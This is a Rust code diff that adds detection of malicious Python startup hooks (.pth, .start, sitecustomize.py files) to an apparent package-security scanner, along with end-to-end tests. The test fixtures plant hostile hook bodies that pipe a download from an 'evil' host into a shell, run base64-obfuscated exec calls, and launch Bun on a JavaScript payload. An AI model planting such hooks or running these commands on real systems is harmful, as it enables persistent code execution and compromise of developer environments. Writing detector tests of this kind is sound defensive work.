@@ -1828,6 +1828,10 @@ pub fn scan(request: &ScanRequest) -> EcosystemScanReport {
     let integrity = if matches!(request.mode, ScanMode::Installed) {
         let report = collect_installed_integrity(request.root);
         findings.extend(report.correlated_findings(effective_policy));
+        // B6: the startup-hook execution correlation (the two startup findings)
+        // runs over the same report's startup signals, folded into the same
+        // verdict so policy overrides apply uniformly.
+        findings.extend(report.startup_correlated_findings());
         Some(report)
     } else {
         None
@@ -2338,6 +2342,21 @@ pub struct InstalledIntegrityReport {
     /// Every granular signal collected (RECORD mismatch, duplicate-owned,
     /// sitecustomize-unowned), the evidence the correlation lists.
     pub signals: Vec<crate::artifact::ArtifactSignal>,
+    /// B6: the granular startup-hook EXECUTION signals collected while reading the
+    /// inventoried `.pth`/`.start`/`sitecustomize.py`/`usercustomize.py` bodies (an
+    /// executing non-template line, a subprocess spawn, a network download, a
+    /// `sys.path` search, obfuscated content, or an untrusted path addition).
+    /// Correlated into the two startup-hook findings, kept separate from the B5
+    /// integrity `signals` so the two correlations do not interfere.
+    pub startup_signals: Vec<crate::artifact::ArtifactSignal>,
+    /// B6: the execution edges discovered from startup hooks (a hook imports a
+    /// module / launches a runtime). Carried for the JSON report and the
+    /// cross-runtime correlation.
+    pub startup_execution_edges: Vec<crate::artifact::ExecutionEdge>,
+    /// B6: `true` when at least one inventoried startup hook launches a different
+    /// language runtime (Bun/Node/Deno) at interpreter start, the Critical
+    /// cross-runtime case.
+    pub startup_cross_runtime: bool,
 }
 
 impl InstalledIntegrityReport {
@@ -2444,6 +2463,135 @@ impl InstalledIntegrityReport {
         }
         kinds.into_iter().collect()
     }
+
+    /// B6: correlate the granular startup-hook signals into AT MOST ONE
+    /// [`RuleId::PythonStartupHookSuspicious`] (High) AND/OR AT MOST ONE
+    /// [`RuleId::PythonStartupHookCrossRuntime`] (Critical) finding (cross-cutting
+    /// invariant 1). Returns an empty vec when no startup signal was recorded.
+    ///
+    /// Suspicious (High -> Block) requires an EXECUTING, non-template hook line
+    /// (`PthExecutableLine`) paired with a danger capability or untrusted path:
+    /// a subprocess spawn, a network download, a `sys.path` search, obfuscated
+    /// content, or an untrusted path addition. A bare path addition with no
+    /// executing line is reported in the JSON inventory but is not, on its own,
+    /// promoted to a Block here (it is a lower-confidence signal).
+    ///
+    /// Cross-runtime (Critical -> Block) fires when a startup hook launches a
+    /// different language runtime (Bun/Node/Deno), keyed on the launched RUNTIME
+    /// name, not the payload filename, so a rename does not evade.
+    fn startup_correlated_findings(&self) -> Vec<Finding> {
+        if self.startup_signals.is_empty() {
+            return Vec::new();
+        }
+
+        let mut findings: Vec<Finding> = Vec::new();
+        let kinds: BTreeSet<crate::artifact::ArtifactSignalKind> =
+            self.startup_signals.iter().map(|s| s.kind).collect();
+        use crate::artifact::ArtifactSignalKind as K;
+
+        // A startup hook must actually EXECUTE for the suspicious finding: a
+        // `PthExecutableLine` (or a malformed import-prefixed line) is the proof of
+        // execution. A `PthUntrustedPathAddition` alone (a non-executing path-add)
+        // is recorded but does not by itself promote to Block.
+        let has_executing_line = kinds.contains(&K::PthExecutableLine);
+        let has_danger = kinds.contains(&K::PthSubprocessSpawn)
+            || kinds.contains(&K::PthNetworkDownload)
+            || kinds.contains(&K::PthSysPathSearch)
+            || kinds.contains(&K::StartupHookObfuscated)
+            || kinds.contains(&K::PthUntrustedPathAddition);
+
+        if has_executing_line && has_danger {
+            let kind_list = startup_distinct_kind_strings(&self.startup_signals);
+            let mut evidence: Vec<Evidence> = Vec::new();
+            evidence.push(Evidence::Text {
+                detail: format!("correlated startup-hook signals: {}", kind_list.join(", ")),
+            });
+            // List the concrete offending lines (the executable-line + untrusted
+            // path-add signals carry the offending text in their evidence).
+            for s in &self.startup_signals {
+                if matches!(s.kind, K::PthExecutableLine | K::PthUntrustedPathAddition) {
+                    evidence.push(Evidence::Text {
+                        detail: s.evidence.clone(),
+                    });
+                }
+            }
+            findings.push(Finding {
+                rule_id: RuleId::PythonStartupHookSuspicious,
+                severity: Severity::High,
+                title: "A Python startup hook executes suspicious code at interpreter start"
+                    .to_string(),
+                description: "An installed startup hook (a .pth import line, a Python 3.15 .start \
+                     entry-point file, or a sitecustomize.py/usercustomize.py) executes \
+                     suspicious code at every interpreter start. The body pairs an executing, \
+                     non-template line with a danger capability (a subprocess spawn, a network \
+                     download, a sys.path search, obfuscated content, or an untrusted path \
+                     addition). Canonical editable-install and namespace-package bootstraps are \
+                     exempt because their complete line matches a known template. Review the named \
+                     hook and reinstall its owning distribution from a trusted source."
+                    .to_string(),
+                evidence,
+                human_view: None,
+                agent_view: None,
+                mitre_id: Some("T1546".to_string()),
+                custom_rule_id: None,
+            });
+        }
+
+        // Cross-runtime: keyed on the recorded flag (set when a hook launches a
+        // foreign runtime). This is the Critical case and is independent of the
+        // suspicious finding (both can fire; the action is Block either way).
+        if self.startup_cross_runtime {
+            let mut evidence: Vec<Evidence> = Vec::new();
+            evidence.push(Evidence::Text {
+                detail: "a startup hook launches a different language runtime \
+                         (Bun/Node/Deno) at interpreter start"
+                    .to_string(),
+            });
+            for edge in &self.startup_execution_edges {
+                if matches!(
+                    edge.trigger,
+                    crate::artifact::ExecutionTrigger::CrossRuntimeInvocation
+                ) {
+                    evidence.push(Evidence::Text {
+                        detail: format!("{} -> {} ({})", edge.from, edge.to, edge.mechanism),
+                    });
+                }
+            }
+            findings.push(Finding {
+                rule_id: RuleId::PythonStartupHookCrossRuntime,
+                severity: Severity::Critical,
+                title: "A Python startup hook launches a different language runtime".to_string(),
+                description:
+                    "An installed Python startup hook launches a separate language runtime \
+                     (Bun, Node, or Deno) at interpreter start. This is the cross-distribution \
+                     loader/payload split used by the live supply-chain campaign, where a Python \
+                     .pth hands execution to a bundled JavaScript payload. The detection keys on \
+                     the launched runtime name, not the payload filename, so renaming the script \
+                     does not evade it. Treat this as an incident: isolate the environment, rotate \
+                     reachable credentials, and reinstall affected distributions from a trusted \
+                     source after confirming the upstream artifact is clean."
+                        .to_string(),
+                evidence,
+                human_view: None,
+                agent_view: None,
+                mitre_id: Some("T1546".to_string()),
+                custom_rule_id: None,
+            });
+        }
+
+        findings
+    }
+}
+
+/// The distinct startup-signal-kind wire strings present, sorted, for evidence.
+fn startup_distinct_kind_strings(signals: &[crate::artifact::ArtifactSignal]) -> Vec<String> {
+    let mut kinds: BTreeSet<String> = BTreeSet::new();
+    for s in signals {
+        if let Ok(serde_json::Value::String(k)) = serde_json::to_value(s.kind) {
+            kinds.insert(k);
+        }
+    }
+    kinds.into_iter().collect()
 }
 
 /// Run the B5 installed-integrity pass over every `site-packages` root under
@@ -2580,10 +2728,20 @@ fn dist_info_dir_identity(dist_info: &Path) -> Option<(String, Option<String>)> 
     Some((name.to_string(), Some(version.to_string())))
 }
 
+/// The maximum startup-hook body size read for execution analysis. A `.pth` /
+/// `.start` / `sitecustomize.py` is tiny in practice (bytes to a few KiB); cap at
+/// 1 MiB so a pathological file cannot drive an unbounded read. A body over the
+/// cap is left in the inventory but not body-analyzed.
+const MAX_STARTUP_HOOK_BYTES: u64 = 1024 * 1024;
+
 /// Scan a `site-packages` root (top level only) for startup-execution files. An
 /// unowned `sitecustomize.py`/`usercustomize.py` emits a `SitecustomizeUnowned`
 /// signal AND is recorded in `unowned_startup_hooks`; `.pth`/`.start`/`.egg-link`
-/// are recorded in `startup_inventory` only (B6 analyzes them).
+/// are recorded in `startup_inventory`. B6: the `.pth`/`.start` and
+/// `sitecustomize.py`/`usercustomize.py` BODIES are then read (no-follow, capped)
+/// and analyzed for execution content via [`crate::artifact::pth::analyze_body`],
+/// folding the granular startup signals / execution edges / cross-runtime flag
+/// into `report` for the two startup-hook correlations.
 fn scan_site_root_startup(
     site: &Path,
     index: &crate::artifact::record::OwnershipIndex,
@@ -2626,12 +2784,82 @@ fn scan_site_root_startup(
                     confidence: EdgeConfidence::High,
                 });
             }
-        } else if lower.ends_with(".pth")
-            || lower.ends_with(".start")
-            || lower.ends_with(".egg-link")
-        {
-            // Inventory for B6; not a standalone finding in B5.
+            // B6: analyze the sitecustomize/usercustomize MODULE body for execution
+            // content regardless of ownership (an OWNED but hostile hook still
+            // executes; ownership is a B5 corroborator, not an exemption here).
+            analyze_startup_hook_body(
+                &path,
+                crate::artifact::pth::StartupHookKind::SiteCustomize,
+                report,
+            );
+        } else if lower.ends_with(".pth") || lower.ends_with(".start") {
+            // Inventory + B6 body analysis (the executing-content surface).
             report.startup_inventory.push(path.display().to_string());
+            let kind = if lower.ends_with(".start") {
+                crate::artifact::pth::StartupHookKind::Start
+            } else {
+                crate::artifact::pth::StartupHookKind::Pth
+            };
+            analyze_startup_hook_body(&path, kind, report);
+        } else if lower.ends_with(".egg-link") {
+            // `.egg-link` points at a project dir (one path per line); it is an
+            // editable-install pointer, not executable startup code. Inventory only.
+            report.startup_inventory.push(path.display().to_string());
+        }
+    }
+}
+
+/// Read one startup-hook body (no-follow, capped) and fold its B6 execution
+/// analysis into `report`: the granular startup signals, the execution edges
+/// (including a cross-runtime edge when a foreign runtime is launched), and the
+/// cross-runtime flag. A body that is unreadable or over [`MAX_STARTUP_HOOK_BYTES`]
+/// contributes nothing (best-effort; the inventory still records the file).
+fn analyze_startup_hook_body(
+    path: &Path,
+    kind: crate::artifact::pth::StartupHookKind,
+    report: &mut InstalledIntegrityReport,
+) {
+    use crate::artifact::{ExecutionEdge, ExecutionTrigger};
+    use crate::location::SubjectLocation;
+
+    let Ok(bytes) = crate::util::read_text_no_follow_capped(path, MAX_STARTUP_HOOK_BYTES) else {
+        return;
+    };
+    // A startup hook is text; decode lossily so a stray non-UTF-8 byte does not
+    // drop the whole body (the analyzer is substring-based and tolerates it).
+    let body = String::from_utf8_lossy(&bytes);
+    let loc = SubjectLocation::installed(path.to_path_buf());
+    let analysis = crate::artifact::pth::analyze_body(&body, &loc, kind);
+
+    report.startup_signals.extend(analysis.signals);
+
+    // A plain bootstrap import emits an execution edge (startup hook imports a
+    // module, which runs its top-level code). The owning distribution is not
+    // resolved here (that is B5's ownership index / B8's cross-artifact pass); the
+    // edge records the hook -> module relationship with the module text.
+    if analysis.capabilities.cross_runtime {
+        report.startup_cross_runtime = true;
+        report.startup_execution_edges.push(ExecutionEdge {
+            from: loc.clone(),
+            trigger: ExecutionTrigger::CrossRuntimeInvocation,
+            to: SubjectLocation::default(),
+            mechanism: "startup hook launches a foreign language runtime (Bun/Node/Deno)"
+                .to_string(),
+            confidence: crate::artifact::EdgeConfidence::High,
+        });
+    }
+    // Emit a generic import edge for each executing bootstrap line (the
+    // "startup hook imports module" relationship the plan calls for), so the JSON
+    // report carries the edge even when no cross-runtime launch is present.
+    for line in &analysis.lines {
+        if line.class.executes() {
+            report.startup_execution_edges.push(ExecutionEdge {
+                from: loc.clone(),
+                trigger: kind.trigger(),
+                to: SubjectLocation::default(),
+                mechanism: format!("startup line imports/executes: {}", line.text.trim()),
+                confidence: crate::artifact::EdgeConfidence::Medium,
+            });
         }
     }
 }
@@ -4425,5 +4653,223 @@ version = "1.0.61"
             report.integrity.is_none(),
             "manifest-mode scan must not compute an integrity report"
         );
+    }
+
+    // ---- B6: Python startup-hook EXECUTION (end-to-end via scan) ---------------
+
+    /// Plant a bare `site-packages` root with one named startup-hook file at its
+    /// top level (a `.pth`/`.start`/`sitecustomize.py`), plus a single owned dist
+    /// so the tree is a realistic install. Returns the root (pass to
+    /// `installed_request`).
+    fn plant_startup_hook(root: &Path, hook_name: &str, body: &[u8]) -> PathBuf {
+        // A minimal owned distribution so the root looks like a real env.
+        let site = plant_installed_dist(
+            root,
+            "base",
+            "1.0",
+            &[("base/__init__.py", b"x = 1\n")],
+            true,
+            &[],
+        );
+        std::fs::write(site.join(hook_name), body).unwrap();
+        root.to_path_buf()
+    }
+
+    #[test]
+    fn startup_pth_os_system_fires_suspicious() {
+        let dir = tempfile::tempdir().unwrap();
+        // A `.pth` whose import line runs a shell at interpreter start.
+        plant_startup_hook(
+            dir.path(),
+            "evil.pth",
+            b"import os; os.system('curl http://evil/x | sh')\n",
+        );
+        let report = scan(&installed_request(dir.path()));
+        let integrity = report.integrity.as_ref().unwrap();
+        assert!(
+            !integrity.startup_signals.is_empty(),
+            "the executing .pth must record startup signals"
+        );
+        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
+        assert!(
+            rules.contains(&RuleId::PythonStartupHookSuspicious),
+            "an os.system .pth must fire the suspicious finding; got {rules:?}"
+        );
+        // High -> Block.
+        assert_eq!(report.verdict.action, Action::Block);
+    }
+
+    #[test]
+    fn startup_pth_cross_runtime_fires_critical() {
+        let dir = tempfile::tempdir().unwrap();
+        // A `.pth` that launches Bun against a sibling JS payload (the campaign's
+        // cross-distribution split). Renaming the script must not evade, so the
+        // rule keys on `bun`, not the filename.
+        plant_startup_hook(
+            dir.path(),
+            "loader.pth",
+            b"import subprocess; subprocess.Popen(['bun', 'run', 'payload/anything.js'])\n",
+        );
+        let report = scan(&installed_request(dir.path()));
+        let integrity = report.integrity.as_ref().unwrap();
+        assert!(
+            integrity.startup_cross_runtime,
+            "a Bun launch must set the cross-runtime flag"
+        );
+        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
+        assert!(
+            rules.contains(&RuleId::PythonStartupHookCrossRuntime),
+            "a Bun-launching .pth must fire the cross-runtime finding; got {rules:?}"
+        );
+        let finding = report
+            .verdict
+            .findings
+            .iter()
+            .find(|f| f.rule_id == RuleId::PythonStartupHookCrossRuntime)
+            .unwrap();
+        assert_eq!(finding.severity, Severity::Critical);
+        assert_eq!(report.verdict.action, Action::Block);
+    }
+
+    #[test]
+    fn startup_pth_base64_obfuscated_fires_suspicious() {
+        use base64::Engine as _;
+        let dir = tempfile::tempdir().unwrap();
+        let inner = "os.system('id')";
+        let encoded = base64::engine::general_purpose::STANDARD.encode(inner);
+        let body = format!("import base64; exec(base64.b64decode('{encoded}'))\n");
+        plant_startup_hook(dir.path(), "hidden.pth", body.as_bytes());
+        let report = scan(&installed_request(dir.path()));
+        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
+        assert!(
+            rules.contains(&RuleId::PythonStartupHookSuspicious),
+            "a base64-obfuscated exec .pth must fire suspicious; got {rules:?}"
+        );
+    }
+
+    #[test]
+    fn startup_pth_tmp_path_addition_alone_does_not_block() {
+        let dir = tempfile::tempdir().unwrap();
+        // A NON-executing path-add line pointing at /tmp: a signal, but on its own
+        // (no executing line) it does not promote to a Block.
+        plant_startup_hook(dir.path(), "paths.pth", b"/tmp/attacker\n");
+        let report = scan(&installed_request(dir.path()));
+        let integrity = report.integrity.as_ref().unwrap();
+        // The untrusted-path signal is recorded.
+        assert!(
+            integrity.startup_signals.iter().any(|s| matches!(
+                s.kind,
+                crate::artifact::ArtifactSignalKind::PthUntrustedPathAddition
+            )),
+            "the /tmp path-add must record an untrusted-path signal"
+        );
+        // But with no executing line, no suspicious finding and no Block.
+        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
+        assert!(
+            !rules.contains(&RuleId::PythonStartupHookSuspicious),
+            "a bare path-add must not promote to the suspicious finding; got {rules:?}"
+        );
+        assert_ne!(report.verdict.action, Action::Block);
+    }
+
+    #[test]
+    fn startup_benign_namespace_pth_stays_clean() {
+        let dir = tempfile::tempdir().unwrap();
+        // A canonical setuptools namespace bootstrap: it begins with `import` and
+        // executes, but is a recognized benign template -> no startup finding.
+        let body =
+            b"import sys, types, os; m = sys.modules.setdefault('ns', types.ModuleType('ns'))\n";
+        plant_startup_hook(dir.path(), "ns-nspkg.pth", body);
+        let report = scan(&installed_request(dir.path()));
+        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
+        assert!(
+            !rules.contains(&RuleId::PythonStartupHookSuspicious)
+                && !rules.contains(&RuleId::PythonStartupHookCrossRuntime),
+            "a benign namespace .pth must produce no startup finding; got {rules:?}"
+        );
+        assert_ne!(report.verdict.action, Action::Block);
+    }
+
+    #[test]
+    fn startup_benign_editable_pth_stays_clean() {
+        let dir = tempfile::tempdir().unwrap();
+        // A setuptools editable finder bootstrap: a known template -> clean.
+        let body = b"import __editable___base_1_0_finder; __editable___base_1_0_finder.install()\n";
+        plant_startup_hook(dir.path(), "__editable__.base-1.0.pth", body);
+        let report = scan(&installed_request(dir.path()));
+        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
+        assert!(
+            !rules.contains(&RuleId::PythonStartupHookSuspicious),
+            "a benign editable .pth must produce no startup finding; got {rules:?}"
+        );
+    }
+
+    #[test]
+    fn startup_tampered_editable_pth_fires() {
+        let dir = tempfile::tempdir().unwrap();
+        // The editable template PLUS an appended malicious call: the complete line
+        // no longer matches the template, so it is analyzed and fires.
+        let body = b"import __editable___base_1_0_finder; __editable___base_1_0_finder.install(); __import__('os').system('curl http://evil | sh')\n";
+        plant_startup_hook(dir.path(), "__editable__.base-1.0.pth", body);
+        let report = scan(&installed_request(dir.path()));
+        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
+        assert!(
+            rules.contains(&RuleId::PythonStartupHookSuspicious),
+            "a tampered editable template must fire suspicious; got {rules:?}"
+        );
+    }
+
+    #[test]
+    fn startup_sitecustomize_body_fires_and_unowned_corroborates() {
+        let dir = tempfile::tempdir().unwrap();
+        // An unowned sitecustomize.py whose MODULE body spawns a shell: B5's
+        // unowned-hook integrity violation AND B6's startup-suspicious both fire.
+        plant_startup_hook(
+            dir.path(),
+            "sitecustomize.py",
+            b"import os\nos.system('curl http://evil | sh')\n",
+        );
+        let report = scan(&installed_request(dir.path()));
+        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
+        assert!(
+            rules.contains(&RuleId::PythonStartupHookSuspicious),
+            "an executing sitecustomize body must fire suspicious; got {rules:?}"
+        );
+        assert!(
+            rules.contains(&RuleId::PythonInstalledIntegrityViolation),
+            "the unowned sitecustomize must also fire the B5 integrity violation"
+        );
+        assert_eq!(report.verdict.action, Action::Block);
+    }
+
+    #[test]
+    fn startup_clean_env_no_startup_findings() {
+        // A realistic clean env with an editable `.pth` pointer and a numpy-shaped
+        // dist must produce NO startup finding (negative control).
+        let dir = tempfile::tempdir().unwrap();
+        let site = plant_installed_dist(
+            dir.path(),
+            "numpyish",
+            "1.26.0",
+            &[
+                ("numpyish/__init__.py", b"from . import _core\n"),
+                (
+                    "numpyish/_core.cpython-311-x86_64-linux-gnu.so",
+                    b"\x7fELF fake\n",
+                ),
+            ],
+            true,
+            &[],
+        );
+        // A plain editable `.pth` that only adds a project directory (path-add).
+        std::fs::write(site.join("project.pth"), b"/home/me/project/src\n").unwrap();
+        let report = scan(&installed_request(dir.path()));
+        let rules: Vec<RuleId> = report.verdict.findings.iter().map(|f| f.rule_id).collect();
+        assert!(
+            !rules.contains(&RuleId::PythonStartupHookSuspicious)
+                && !rules.contains(&RuleId::PythonStartupHookCrossRuntime),
+            "a clean env must produce no startup finding; got {rules:?}"
+        );
+        assert_ne!(report.verdict.action, Action::Block);
     }
 }
